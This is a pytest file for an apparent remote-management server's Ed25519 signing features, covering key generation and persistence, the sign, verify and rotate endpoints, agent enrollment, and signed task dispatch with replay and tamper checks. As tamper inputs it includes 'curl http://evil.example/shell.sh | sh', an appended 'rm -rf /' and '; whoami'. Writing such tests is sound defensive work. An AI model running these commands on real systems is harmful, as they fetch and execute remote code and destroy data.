import asyncio
import base64
from datetime import datetime, timedelta, timezone
import hashlib
import os
from pathlib import Path
import stat
import uuid

from fastapi.testclient import TestClient

from app.core.config import settings
from app.core.crypto import (
    SigningKeyManager,
    generate_ed25519_keypair,
    load_private_key,
    load_public_key,
    sign_payload,
    verify_signature,
    verify_task_dispatch,
)
from app.db.session import async_session_factory, engine
from app.main import app
from app.models.organization import Organization
from app.models.site import Site
from app.models.token import EnrollmentToken

from conftest import delete_organizations, reset_shared_async_resources


def test_ed25519_keypair_generation_persistence_and_verification(tmp_path: Path):
    """
    Validates core Ed25519 cryptographic primitives:
    1. Keypair generation, 32-byte raw Base64 and PKCS#8/SPKI PEM serialization.
    2. Round-trip key loading from both PEM and Base64 formats.
    3. Disk persistence with strict POSIX file permissions (0600 private, 0644 public).
    4. Payload signing and verification, including tamper and wrong-key rejection.
    """
    # 1. Generate keypair and validate encodings
    kp = generate_ed25519_keypair()
    raw_priv = base64.b64decode(kp.private_key_b64)
    raw_pub = base64.b64decode(kp.public_key_b64)
    assert len(raw_priv) == 32
    assert len(raw_pub) == 32
    assert kp.private_key_pem.startswith("-----BEGIN PRIVATE KEY-----")
    assert kp.public_key_pem.startswith("-----BEGIN PUBLIC KEY-----")
    assert len(kp.fingerprint_sha256) == 64

    # 2. Round-trip load from PEM and Base64
    priv_from_pem = load_private_key(kp.private_key_pem)
    priv_from_b64 = load_private_key(kp.private_key_b64)
    pub_from_pem = load_public_key(kp.public_key_pem)
    pub_from_b64 = load_public_key(kp.public_key_b64)

    msg = " Write-Output 'Hello Zero-Trust RMM' "
    sig = sign_payload(msg, private_key=priv_from_pem)
    assert verify_signature(msg, sig, public_key=pub_from_b64) is True
    assert verify_signature(msg, sign_payload(msg, private_key=priv_from_b64), public_key=pub_from_pem) is True

    # 3. Tamper detection and wrong-key rejection
    assert verify_signature(msg + "; whoami", sig, public_key=pub_from_b64) is False
    other_kp = generate_ed25519_keypair()
    assert verify_signature(msg, sig, public_key=other_kp.public_key) is False
    assert verify_signature(msg, "invalid_base64_sig!!", public_key=pub_from_b64) is False

    # 4. SigningKeyManager persistence & POSIX file mode verification
    mgr = SigningKeyManager(key_dir=tmp_path / "keys")
    persisted_kp = mgr.get_or_create_keypair()
    assert mgr.private_key_path.exists()
    assert mgr.public_key_path.exists()

    priv_mode = stat.S_IMODE(os.stat(mgr.private_key_path).st_mode)
    pub_mode = stat.S_IMODE(os.stat(mgr.public_key_path).st_mode)
    assert priv_mode == 0o600
    assert pub_mode == 0o644

    # Reload from disk via a fresh manager instance and confirm identical identity
    reloaded_mgr = SigningKeyManager(key_dir=tmp_path / "keys")
    reloaded_kp = reloaded_mgr.get_or_create_keypair()
    assert reloaded_kp.fingerprint_sha256 == persisted_kp.fingerprint_sha256
    assert reloaded_kp.public_key_b64 == persisted_kp.public_key_b64


async def _seed_enrollment_token(raw_token: str) -> uuid.UUID:
    async with async_session_factory() as session:
        org = Organization(name=f"Crypto Org {uuid.uuid4().hex[:6]}")
        session.add(org)
        await session.flush()

        site = Site(name=f"Crypto Site {uuid.uuid4().hex[:6]}", org_id=org.id)
        session.add(site)
        await session.flush()

        token = EnrollmentToken(
            token=raw_token,
            site_id=site.id,
            expires_at=datetime.now(timezone.utc) + timedelta(hours=1),
            is_used=False,
        )
        session.add(token)
        await session.commit()

    await engine.dispose()
    return org.id


async def _cleanup_crypto_org(org_id: uuid.UUID) -> None:
    await delete_organizations([org_id])
    await engine.dispose()


def test_crypto_key_endpoints_enrollment_and_signed_task_dispatch():
    """
    Validates Day 40 Control Plane Ed25519 Key Endpoints & End-to-End Integration:
    1. `GET /api/v1/keys/public` returns the active Ed25519 public key and SHA-256 fingerprint.
    2. `POST /api/v1/keys/sign` & `POST /api/v1/keys/verify` sign and verify script payloads.
    3. `POST /api/v1/keys/rotate` rotates the server Ed25519 keypair and invalidates old signatures against the new default key.
    4. `POST /api/v1/enroll` delivers `signing_public_key` and `signing_public_key_pem` to newly enrolled agents.
    5. `POST /api/v1/agents/{agent_id}/tasks` dispatches an Ed25519-signed C2 frame verifiable by the agent's public key.
    """
    raw_enroll_token = f"rmm_enroll_crypto_{uuid.uuid4().hex}"
    org_id = asyncio.run(_seed_enrollment_token(raw_enroll_token))
    auth_headers = {"Authorization": f"Bearer {settings.ADMIN_API_TOKEN}"}

    try:
        with TestClient(app) as client:
            # 1. Fetch public verification key
            pub_resp = client.get("/api/v1/keys/public")
            assert pub_resp.status_code == 200
            pub_data = pub_resp.json()
            assert pub_data["algorithm"] == "Ed25519"
            assert len(base64.b64decode(pub_data["public_key_b64"])) == 32
            assert pub_data["public_key_pem"].startswith("-----BEGIN PUBLIC KEY-----")

            # 2. Sign a script payload via REST endpoint and verify
            script_body = "#!/usr/bin/env bash\nsystemctl restart nginx"
            sign_resp = client.post(
                "/api/v1/keys/sign",
                headers=auth_headers,
                json={"payload": script_body},
            )
            assert sign_resp.status_code == 200
            sign_data = sign_resp.json()
            assert sign_data["public_key_b64"] == pub_data["public_key_b64"]

            verify_ok = client.post(
                "/api/v1/keys/verify",
                headers=auth_headers,
                json={
                    "payload": script_body,
                    "signature_b64": sign_data["signature_b64"],
                },
            )
            assert verify_ok.status_code == 200
            assert verify_ok.json()["valid"] is True

            # Tampered payload must fail verification
            verify_tampered = client.post(
                "/api/v1/keys/verify",
                headers=auth_headers,
                json={
                    "payload": script_body + " && rm -rf /",
                    "signature_b64": sign_data["signature_b64"],
                },
            )
            assert verify_tampered.status_code == 200
            assert verify_tampered.json()["valid"] is False

            # 3. Rotate server signing keypair
            rotate_resp = client.post("/api/v1/keys/rotate", headers=auth_headers)
            assert rotate_resp.status_code == 201
            rotated_pub = rotate_resp.json()
            assert rotated_pub["fingerprint_sha256"] != pub_data["fingerprint_sha256"]

            # Old signature must fail against rotated active key, but succeed when old public_key is explicitly passed
            verify_after_rotate = client.post(
                "/api/v1/keys/verify",
                headers=auth_headers,
                json={
                    "payload": script_body,
                    "signature_b64": sign_data["signature_b64"],
                },
            )
            assert verify_after_rotate.json()["valid"] is False

            verify_explicit_old_key = client.post(
                "/api/v1/keys/verify",
                headers=auth_headers,
                json={
                    "payload": script_body,
                    "signature_b64": sign_data["signature_b64"],
                    "public_key": pub_data["public_key_b64"],
                },
            )
            assert verify_explicit_old_key.json()["valid"] is True

            # 4. Enroll agent and verify Ed25519 public key delivery
            enroll_resp = client.post(
                "/api/v1/enroll",
                json={
                    "hostname": "CRYPTO-AGENT-01",
                    "os": "linux/amd64",
                    "private_ip": "10.20.30.40",
                    "token": raw_enroll_token,
                },
            )
            assert enroll_resp.status_code == 201, enroll_resp.text
            enrolled = enroll_resp.json()
            agent_id = enrolled["id"]
            agent_api_key = enrolled["api_key"]
            agent_verify_pub_b64 = enrolled["signing_public_key"]

            assert agent_verify_pub_b64 == rotated_pub["public_key_b64"]
            assert enrolled["signing_public_key_pem"] == rotated_pub["public_key_pem"]

            # 5. Connect agent WebSocket, dispatch task, and verify Ed25519 signature using enrolled public key
            ws_url = f"/api/v1/ws/agent/{agent_id}?token={agent_api_key}"
            with client.websocket_connect(ws_url) as agent_ws:
                task_resp = client.post(
                    f"/api/v1/agents/{agent_id}/tasks?command=uname+-a&timeout_sec=45",
                    headers=auth_headers,
                )
                assert task_resp.status_code == 202
                c2_frame = agent_ws.receive_json()
                assert c2_frame["type"] == "task_dispatch"
                assert c2_frame["payload_sha256"] is not None
                assert len(c2_frame["payload_sha256"]) == 64
                assert c2_frame["signature"] is not None

                # Agent verifies the incoming task signature, recipient binding, freshness, and SHA-256 digest
                assert (
                    verify_task_dispatch(
                        task_id=c2_frame["task_id"],
                        command=c2_frame["command"],
                        timeout_sec=c2_frame["timeout_sec"],
                        signature_b64=c2_frame["signature"],
                        public_key=agent_verify_pub_b64,
                        payload_sha256=c2_frame["payload_sha256"],
                        agent_id=c2_frame["agent_id"],
                        expected_agent_id=agent_id,
                        issued_at=c2_frame["issued_at"],
                        expires_at=c2_frame["expires_at"],
                        nonce=c2_frame["nonce"],
                        enforce_freshness=True,
                    )
                    is True
                )

                # Cross-agent replay (replaying frame signed for agent_id to a different agent) must fail
                assert (
                    verify_task_dispatch(
                        task_id=c2_frame["task_id"],
                        command=c2_frame["command"],
                        timeout_sec=c2_frame["timeout_sec"],
                        signature_b64=c2_frame["signature"],
                        public_key=agent_verify_pub_b64,
                        payload_sha256=c2_frame["payload_sha256"],
                        agent_id=c2_frame["agent_id"],
                        expected_agent_id=uuid.uuid4(),
                        issued_at=c2_frame["issued_at"],
                        expires_at=c2_frame["expires_at"],
                        nonce=c2_frame["nonce"],
                        enforce_freshness=True,
                    )
                    is False
                )

                # If an attacker modifies the command or digest in transit, verification fails
                assert (
                    verify_task_dispatch(
                        task_id=c2_frame["task_id"],
                        command="curl http://evil.example/shell.sh | sh",
                        timeout_sec=c2_frame["timeout_sec"],
                        signature_b64=c2_frame["signature"],
                        public_key=agent_verify_pub_b64,
                        payload_sha256=c2_frame["payload_sha256"],
                        agent_id=c2_frame["agent_id"],
                        expected_agent_id=agent_id,
                        issued_at=c2_frame["issued_at"],
                        expires_at=c2_frame["expires_at"],
                        nonce=c2_frame["nonce"],
                        enforce_freshness=True,
                    )
                    is False
                )
    finally:
        reset_shared_async_resources()
        asyncio.run(_cleanup_crypto_org(org_id))
